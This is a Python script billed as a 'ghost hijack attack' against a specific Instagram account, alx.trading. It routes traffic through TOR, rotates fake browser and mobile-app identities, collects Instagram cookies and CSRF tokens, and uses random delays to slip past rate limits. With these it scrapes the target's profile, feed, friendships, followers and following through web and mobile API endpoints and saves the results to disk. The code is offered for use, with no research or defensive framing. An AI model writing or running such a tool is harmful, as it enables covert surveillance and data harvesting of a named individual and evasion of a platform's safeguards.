#!/usr/bin/env python3
"""
🔥 DIRECT GHOST HIJACK ATTACK - NO PROXY AUTH 🔥
===============================================
Target: alx.trading
Method: Direct Connection + TOR + Ghost Mode
Status: EXECUTING NOW
"""

import requests
import json
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor
import urllib3
import uuid
import subprocess
import os
urllib3.disable_warnings()

class DirectGhostAttack:
    def __init__(self):
        self.target = "alx.trading"
        
        # TOR proxies (if available)
        self.tor_proxies = [
            "socks5://127.0.0.1:9050",
            "socks5://127.0.0.1:9051", 
            "socks5://127.0.0.1:9052"
        ]
        
        # Ghost user agents
        self.ghost_agents = [
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
            "Mozilla/5.0 (iPad; CPU OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Instagram 305.0.0.11.111 Android (28/9; 420dpi; 1080x2340; samsung; SM-G973F; beyond1; exynos9820; en_US; 458229237)",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        ]
        
        self.ghost_sessions = []
        self.successful_extractions = []
        
    def create_direct_ghost_session(self, use_tor=False):
        """สร้าง ghost session แบบ direct หรือ TOR"""
        try:
            session = requests.Session()
            
            # Random ghost configuration
            session.headers.update({
                'User-Agent': random.choice(self.ghost_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9,th;q=0.8,ja;q=0.7',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Cache-Control': 'no-cache',
                'DNT': '1',
                'Pragma': 'no-cache'
            })
            
            # Try TOR if requested and available
            if use_tor and self.tor_proxies:
                for tor_proxy in self.tor_proxies:
                    try:
                        session.proxies = {'http': tor_proxy, 'https': tor_proxy}
                        test_response = session.get('https://httpbin.org/ip', timeout=10)
                        if test_response.status_code == 200:
                            ip_info = test_response.json()
                            print(f"👻 Ghost session via TOR: {ip_info['origin']}")
                            return session
                    except:
                        continue
                        
                # TOR failed, fall back to direct
                session.proxies = {}
                print("👻 TOR failed, using direct connection")
            
            # Test direct connection
            test_response = session.get('https://httpbin.org/ip', timeout=10)
            if test_response.status_code == 200:
                ip_info = test_response.json()
                print(f"👻 Ghost session via direct: {ip_info['origin']}")
                return session
            else:
                print(f"❌ Direct connection test failed: {test_response.status_code}")
                return None
                
        except Exception as e:
            print(f"❌ Ghost session creation failed: {e}")
            return None
    
    def hijack_instagram_session(self, session):
        """Hijack Instagram session และ cookies"""
        try:
            print("🍪 Hijacking Instagram session...")
            
            # เข้า Instagram homepage
            response = session.get('https://www.instagram.com/', timeout=15)
            
            if response.status_code == 200:
                print(f"✅ Instagram accessed: {response.status_code}")
                
                # Extract cookies
                cookies = dict(session.cookies)
                print(f"🍪 Hijacked {len(cookies)} cookies")
                
                # Extract CSRF token และ other tokens
                csrf_token = cookies.get('csrftoken', '')
                mid_token = cookies.get('mid', '')
                ig_did = cookies.get('ig_did', '')
                
                if csrf_token:
                    print(f"🔐 CSRF token: {csrf_token[:15]}...")
                if mid_token:
                    print(f"🔐 MID token: {mid_token[:15]}...")
                if ig_did:
                    print(f"🔐 IG_DID: {ig_did[:15]}...")
                
                return {
                    'cookies': cookies,
                    'csrf_token': csrf_token,
                    'mid_token': mid_token,
                    'ig_did': ig_did,
                    'session': session
                }
            else:
                print(f"❌ Instagram access failed: {response.status_code}")
                return None
                
        except Exception as e:
            print(f"❌ Instagram session hijacking failed: {e}")
            return None
    
    def ghost_profile_extraction(self, hijacked_data):
        """ดึงข้อมูล profile ด้วย ghost mode"""
        try:
            session = hijacked_data['session']
            csrf_token = hijacked_data['csrf_token']
            
            print(f"👻 Ghost extracting profile: {self.target}")
            
            # Multiple target endpoints
            target_endpoints = [
                f"https://www.instagram.com/{self.target}/",
                f"https://www.instagram.com/{self.target}/?__a=1&__d=dis",
                f"https://i.instagram.com/api/v1/users/web_info/?username={self.target}",
                f"https://www.instagram.com/web/search/topsearch/?query={self.target}",
                f"https://www.instagram.com/api/v1/users/{self.target}/info/"
            ]
            
            # Enhanced headers
            enhanced_headers = {
                'X-CSRFToken': csrf_token,
                'X-Instagram-AJAX': '1007394936',
                'X-IG-App-ID': '936619743392459',
                'X-IG-WWW-Claim': '0',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': f'https://www.instagram.com/{self.target}/',
                'Origin': 'https://www.instagram.com'
            }
            
            results = []
            
            for i, endpoint in enumerate(target_endpoints):
                try:
                    print(f"🎯 Ghost extraction {i+1}/{len(target_endpoints)}")
                    
                    # Human-like random delay
                    delay = random.uniform(3.2, 9.7)
                    print(f"   ⏳ Ghost delay: {delay:.1f}s")
                    time.sleep(delay)
                    
                    # Update headers for API calls
                    if 'api' in endpoint or '__a=1' in endpoint:
                        session.headers.update(enhanced_headers)
                    
                    # Make request
                    response = session.get(endpoint, timeout=20, verify=False)
                    
                    print(f"   📡 {response.status_code} | {len(response.content)} bytes")
                    
                    if response.status_code == 200:
                        timestamp = int(time.time())
                        endpoint_id = endpoint.split('/')[-1].replace('?', '_')[:20]
                        
                        try:
                            # Try JSON parsing
                            data = response.json()
                            filename = f'ghost_extract_{self.target}_{endpoint_id}_{timestamp}.json'
                            with open(filename, 'w', encoding='utf-8') as f:
                                json.dump(data, f, indent=2, ensure_ascii=False)
                            print(f"   💾 JSON saved: {filename}")
                            results.append({'type': 'json', 'file': filename, 'size': len(response.content)})
                            
                            # Check for valuable data
                            if 'user' in data or 'data' in data:
                                print("   🎯 Valuable user data detected!")
                                self.successful_extractions.append(filename)
                                
                        except:
                            # Save as HTML
                            filename = f'ghost_extract_{self.target}_{endpoint_id}_{timestamp}.html'
                            with open(filename, 'w', encoding='utf-8') as f:
                                f.write(response.text)
                            print(f"   💾 HTML saved: {filename}")
                            results.append({'type': 'html', 'file': filename, 'size': len(response.content)})
                            
                            # Check for profile indicators
                            if any(indicator in response.text.lower() for indicator in ['followers', 'following', 'posts', 'biography']):
                                print("   🎯 Profile data detected!")
                                self.successful_extractions.append(filename)
                    
                    elif response.status_code == 429:
                        print("   ⚠️ Rate limited - extending ghost delay")
                        time.sleep(random.uniform(60, 180))
                        
                    elif response.status_code in [404, 403]:
                        print(f"   🔒 Access restricted: {response.status_code}")
                        
                    else:
                        print(f"   ❌ Unexpected response: {response.status_code}")
                    
                except Exception as e:
                    print(f"   ❌ Endpoint error: {e}")
                    time.sleep(random.uniform(5, 15))
            
            return results
            
        except Exception as e:
            print(f"❌ Ghost profile extraction failed: {e}")
            return []
    
    def mobile_instagram_api_attack(self, hijacked_data):
        """โจมตี mobile Instagram API"""
        try:
            session = hijacked_data['session']
            
            print("📱 Mobile Instagram API attack...")
            
            # Mobile API endpoints
            mobile_apis = [
                f"https://i.instagram.com/api/v1/users/{self.target}/info/",
                f"https://i.instagram.com/api/v1/users/search/?q={self.target}",
                f"https://i.instagram.com/api/v1/feed/user/{self.target}/",
                f"https://i.instagram.com/api/v1/users/{self.target}/",
                f"https://i.instagram.com/api/v1/friendships/{self.target}/show/"
            ]
            
            # Mobile headers
            mobile_headers = {
                'User-Agent': 'Instagram 305.0.0.11.111 Android (28/9; 420dpi; 1080x2340; samsung; SM-G973F; beyond1; exynos9820; en_US; 458229237)',
                'X-IG-App-ID': '567067343352427',
                'X-IG-Android-ID': 'android-' + ''.join(random.choices('0123456789abcdef', k=16)),
                'Accept-Language': 'en-US',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept-Encoding': 'gzip, deflate',
                'Host': 'i.instagram.com',
                'Connection': 'keep-alive',
                'X-FB-HTTP-Engine': 'Liger'
            }
            
            session.headers.update(mobile_headers)
            
            mobile_results = []
            
            for i, api in enumerate(mobile_apis):
                try:
                    print(f"📱 Mobile API {i+1}/{len(mobile_apis)}")
                    
                    time.sleep(random.uniform(4, 12))
                    
                    response = session.get(api, timeout=15)
                    
                    print(f"   📱 {response.status_code} | {len(response.content)} bytes")
                    
                    if response.status_code == 200:
                        try:
                            data = response.json()
                            timestamp = int(time.time())
                            api_name = api.split('/')[-2] if api.endswith('/') else api.split('/')[-1]
                            filename = f'mobile_api_{self.target}_{api_name}_{timestamp}.json'
                            with open(filename, 'w') as f:
                                json.dump(data, f, indent=2)
                            print(f"   📱 Mobile data saved: {filename}")
                            mobile_results.append(filename)
                            self.successful_extractions.append(filename)
                        except:
                            pass
                            
                except Exception as e:
                    print(f"   ❌ Mobile API error: {e}")
            
            return mobile_results
            
        except Exception as e:
            print(f"❌ Mobile Instagram API attack failed: {e}")
            return []
    
    def advanced_data_mining(self, hijacked_data):
        """Advanced data mining techniques"""
        try:
            session = hijacked_data['session']
            
            print("⛏️ Advanced data mining...")
            
            # Search and discovery endpoints
            mining_endpoints = [
                f"https://www.instagram.com/web/search/topsearch/?context=blended&query={self.target}",
                f"https://www.instagram.com/web/search/topsearch/?context=user&query={self.target}",
                f"https://www.instagram.com/web/search/topsearch/?context=hashtag&query={self.target}",
                f"https://www.instagram.com/{self.target}/followers/",
                f"https://www.instagram.com/{self.target}/following/"
            ]
            
            mining_results = []
            
            for endpoint in mining_endpoints:
                try:
                    print(f"⛏️ Mining: {endpoint.split('/')[-2:]}")
                    
                    time.sleep(random.uniform(5, 15))
                    
                    response = session.get(endpoint, timeout=15)
                    
                    if response.status_code == 200:
                        timestamp = int(time.time())
                        mining_type = 'search' if 'search' in endpoint else 'social'
                        filename = f'mining_{mining_type}_{self.target}_{timestamp}.html'
                        
                        with open(filename, 'w', encoding='utf-8') as f:
                            f.write(response.text)
                        
                        print(f"   ⛏️ Mining data saved: {filename}")
                        mining_results.append(filename)
                        
                except Exception as e:
                    print(f"   ❌ Mining error: {e}")
            
            return mining_results
            
        except Exception as e:
            print(f"❌ Advanced data mining failed: {e}")
            return []
    
    def execute_direct_ghost_attack(self):
        """รันการโจมตี Direct Ghost Attack"""
        print("🔥 DIRECT GHOST HIJACK ATTACK")
        print("=" * 40)
        print(f"🎯 Target: {self.target}")
        print(f"👻 Ghost agents: {len(self.ghost_agents)}")
        print("🌐 Method: Direct + TOR fallback")
        print("=" * 40)
        
        # Phase 1: Create multiple ghost sessions
        print("\n👻 PHASE 1: CREATING GHOST SESSIONS")
        
        # Try to create 3-5 ghost sessions
        for i in range(5):
            print(f"🔗 Creating ghost session {i+1}/5")
            session = self.create_direct_ghost_session(use_tor=(i >= 2))  # Use TOR for sessions 3+
            if session:
                self.ghost_sessions.append(session)
            time.sleep(random.uniform(3, 8))
        
        print(f"✅ {len(self.ghost_sessions)} ghost sessions created")
        
        if not self.ghost_sessions:
            print("❌ No ghost sessions available")
            return False
        
        # Phase 2: Hijack Instagram sessions
        print("\n🍪 PHASE 2: HIJACKING INSTAGRAM SESSIONS")
        hijacked_sessions = []
        
        for i, session in enumerate(self.ghost_sessions[:3]):  # Use max 3 sessions
            print(f"🍪 Hijacking session {i+1}")
            hijacked_data = self.hijack_instagram_session(session)
            if hijacked_data:
                hijacked_sessions.append(hijacked_data)
            time.sleep(random.uniform(5, 12))
        
        print(f"✅ {len(hijacked_sessions)} sessions hijacked")
        
        # Phase 3: Multi-threaded ghost extraction
        print("\n👻 PHASE 3: MULTI-GHOST EXTRACTION")
        all_results = []
        
        if hijacked_sessions:
            with ThreadPoolExecutor(max_workers=min(2, len(hijacked_sessions))) as executor:
                futures = []
                
                for i, hijacked_data in enumerate(hijacked_sessions):
                    print(f"🚀 Launching ghost extraction {i+1}")
                    future = executor.submit(self.ghost_profile_extraction, hijacked_data)
                    futures.append(future)
                    time.sleep(random.uniform(8, 20))
                
                # Collect results
                for future in futures:
                    try:
                        result = future.result(timeout=180)
                        all_results.extend(result)
                    except Exception as e:
                        print(f"❌ Ghost extraction error: {e}")
        
        # Phase 4: Mobile API attack
        print("\n📱 PHASE 4: MOBILE API ATTACK")
        if hijacked_sessions:
            mobile_results = self.mobile_instagram_api_attack(hijacked_sessions[0])
            all_results.extend([{'type': 'mobile', 'file': f} for f in mobile_results])
        
        # Phase 5: Advanced data mining
        print("\n⛏️ PHASE 5: ADVANCED DATA MINING")
        if hijacked_sessions:
            mining_results = self.advanced_data_mining(hijacked_sessions[0])
            all_results.extend([{'type': 'mining', 'file': f} for f in mining_results])
        
        # Final summary
        print("\n📊 ATTACK SUMMARY")
        print("=" * 30)
        print(f"🎯 Target: {self.target}")
        print(f"👻 Ghost sessions: {len(self.ghost_sessions)}")
        print(f"🍪 Hijacked sessions: {len(hijacked_sessions)}")
        print(f"📁 Total files: {len(all_results)}")
        print(f"💎 Successful extractions: {len(self.successful_extractions)}")
        
        # Save summary
        summary = {
            'timestamp': time.time(),
            'target': self.target,
            'ghost_sessions': len(self.ghost_sessions),
            'hijacked_sessions': len(hijacked_sessions),
            'total_files': len(all_results),
            'successful_extractions': self.successful_extractions,
            'attack_method': 'Direct Ghost Hijack Attack',
            'files_by_type': {}
        }
        
        # Count files by type
        for result in all_results:
            file_type = result.get('type', 'unknown')
            summary['files_by_type'][file_type] = summary['files_by_type'].get(file_type, 0) + 1
        
        with open(f'direct_ghost_attack_summary_{int(time.time())}.json', 'w') as f:
            json.dump(summary, f, indent=2)
        
        print(f"📋 Summary saved: direct_ghost_attack_summary_{int(time.time())}.json")
        
        if self.successful_extractions:
            print("\n🎉 DIRECT GHOST ATTACK SUCCESSFUL!")
            print(f"💎 {len(self.successful_extractions)} files with valuable data!")
            for file in self.successful_extractions[:5]:
                print(f"   📄 {file}")
            return True
        else:
            print("\n⚠️ DIRECT GHOST ATTACK COMPLETED")
            print("🔍 Check saved files for any extracted data")
            return False


if __name__ == "__main__":
    print("🔥 DIRECT GHOST HIJACK ATTACK")
    print("=" * 50)
    print("🎯 Target: alx.trading")
    print("⚡ Status: EXECUTING NOW")
    print("🌐 Method: Direct Connection + Ghost Mode")
    print("=" * 50)
    
    # Execute attack
    attack = DirectGhostAttack()
    success = attack.execute_direct_ghost_attack()
    
    if success:
        print("\n🎉 OPERATION SUCCESSFUL!")
        print("💎 Valuable data extracted and saved!")
    else:
        print("\n⚠️ OPERATION COMPLETED")
        print("📁 Check files for any extracted data")
    
    print("\n🔥 SugarGlitch RealOps - Direct Ghost Operations")
